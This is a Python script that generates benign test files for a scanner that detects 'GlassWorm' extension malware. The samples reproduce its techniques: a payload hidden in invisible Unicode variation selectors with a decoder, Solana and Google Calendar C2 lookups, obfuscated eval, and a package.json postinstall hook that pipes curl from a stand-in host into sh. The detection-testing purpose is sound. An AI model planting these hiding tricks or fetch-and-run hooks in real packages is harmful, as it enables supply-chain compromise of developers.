#!/usr/bin/env python3
"""
GlassWorm Test Sample Generator
================================
Generates SAFE test files containing invisible Unicode characters
to verify your scanner/detection tools work correctly.

This does NOT create malware — it creates benign files with the
same Unicode patterns GlassWorm uses, so you can validate detection.
"""

import os
import json

OUTPUT_DIR = "glassworm_test_samples"


def generate_vs_payload(message: str) -> str:
    """
    Encode a benign string using the same variation-selector technique
    GlassWorm uses. This demonstrates the encoding — the 'payload'
    here is just a harmless console.log().
    """
    encoded_chars = []
    for byte in message.encode("utf-8"):
        # GlassWorm splits each byte into two nibbles and maps them
        # to variation selectors U+FE00–U+FE0F
        high_nibble = (byte >> 4) & 0x0F
        low_nibble = byte & 0x0F
        encoded_chars.append(chr(0xFE00 + high_nibble))
        encoded_chars.append(chr(0xFE00 + low_nibble))
    return "".join(encoded_chars)


def generate_test_files():
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # ── Test 1: Basic invisible payload (SHOULD trigger CRITICAL) ─────
    benign_message = 'console.log("This is a safe test payload")'
    invisible = generate_vs_payload(benign_message)

    test1 = f'''import * as vscode from 'vscode';
{invisible}
export function activate(context) {{
    // This file simulates GlassWorm's invisible code injection
    // The line above contains {len(invisible)} invisible Unicode characters
    console.log("Extension activated");
}}
'''
    with open(os.path.join(OUTPUT_DIR, "test_01_basic_payload.js"), "w", encoding="utf-8") as f:
        f.write(test1)
    print(f"[+] test_01_basic_payload.js — invisible VS cluster ({len(invisible)} chars)")

    # ── Test 2: Decoder pattern near invisible chars (CRITICAL) ───────
    test2 = f'''// Simulated GlassWorm decoder + payload
const encoded = "{invisible}";
function decode(str) {{
    let result = [];
    for (let i = 0; i < str.length; i += 2) {{
        const high = str.codePointAt(i) - 0xFE00;
        const low = str.codePointAt(i + 1) - 0xFE00;
        result.push(String.fromCharCode((high << 4) | low));
    }}
    return result.join("");
}}
// In real GlassWorm: eval(decode(encoded))
// Here we just log it:
console.log(decode(encoded));
'''
    with open(os.path.join(OUTPUT_DIR, "test_02_decoder_pattern.js"), "w", encoding="utf-8") as f:
        f.write(test2)
    print("[+] test_02_decoder_pattern.js — decoder + invisible chars")

    # ── Test 3: Solana C2 indicator (MEDIUM) ──────────────────────────
    test3 = '''// Simulated blockchain C2 pattern
async function checkUpdates() {
    const connection = new Connection("https://api.mainnet-beta.solana.com");
    const signatures = await connection.getSignaturesForAddress(pubKey);
    for (const sig of signatures) {
        const tx = await connection.getParsedTransaction(sig.signature);
        // GlassWorm reads C2 URLs from Solana memo program transactions
        const memo = tx.transaction.message.instructions
            .find(i => i.programId === "MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");
    }
}
'''
    with open(os.path.join(OUTPUT_DIR, "test_03_solana_c2.js"), "w", encoding="utf-8") as f:
        f.write(test3)
    print("[+] test_03_solana_c2.js — Solana C2 indicators")

    # ── Test 4: Suspicious package.json (HIGH) ────────────────────────
    test4 = {
        "name": "totally-legit-extension",
        "version": "1.0.0",
        "scripts": {
            "postinstall": "node -e \"require('child_process').exec('curl -s https://example.com/update.sh | sh')\"",
            "build": "tsc -p .",
        },
        "dependencies": {},
    }
    with open(os.path.join(OUTPUT_DIR, "test_04_suspicious_package.json"), "w") as f:
        json.dump(test4, f, indent=2)
    print("[+] test_04_suspicious_package.json — malicious lifecycle script")

    # ── Test 5: eval() with string construction (HIGH) ────────────────
    test5 = '''// Simulated obfuscated eval pattern
const parts = [83, 116, 114, 105, 110, 103];
const fn = parts.reduce((a, c) => a + String.fromCharCode(c), "");
eval(fn + '.fromCharCode(72,101,108,108,111)');
'''
    with open(os.path.join(OUTPUT_DIR, "test_05_eval_construction.js"), "w", encoding="utf-8") as f:
        f.write(test5)
    print("[+] test_05_eval_construction.js — eval + string construction")

    # ── Test 6: Clean file (should NOT trigger) ───────────────────────
    test6 = '''import * as vscode from 'vscode';

export function activate(context) {
    const disposable = vscode.commands.registerCommand(
        'extension.helloWorld',
        () => vscode.window.showInformationMessage('Hello World!')
    );
    context.subscriptions.push(disposable);
}

export function deactivate() {}
'''
    with open(os.path.join(OUTPUT_DIR, "test_06_clean_file.js"), "w", encoding="utf-8") as f:
        f.write(test6)
    print("[+] test_06_clean_file.js — clean file (no findings expected)")

    # ── Test 7: Mid-file BOM (MEDIUM) ─────────────────────────────────
    test7 = '''// Normal code here
const x = 42;
\ufeff// This line has a BOM character mid-file
const y = x * 2;
'''
    with open(os.path.join(OUTPUT_DIR, "test_07_midfile_bom.js"), "w", encoding="utf-8") as f:
        f.write(test7)
    print("[+] test_07_midfile_bom.js — mid-file BOM character")

    # ── Test 8: Google Calendar backup C2 ─────────────────────────────
    test8 = '''// Simulated GlassWorm backup C2 via Google Calendar
async function getBackupConfig() {
    const response = await fetch(
        "https://calendar.google.com/calendar/ical/abc123/public/basic.ics"
    );
    const data = await response.text();
    // GlassWorm parses calendar event descriptions for fallback C2 URLs
    return parseConfig(data);
}
'''
    with open(os.path.join(OUTPUT_DIR, "test_08_gcal_c2.js"), "w", encoding="utf-8") as f:
        f.write(test8)
    print("[+] test_08_gcal_c2.js — Google Calendar C2 pattern")

    print(f"\n✅ Generated {8} test files in ./{OUTPUT_DIR}/")
    print(f"   Run: python3 glassworm_scanner.py {OUTPUT_DIR} --verbose")


if __name__ == "__main__":
    generate_test_files()
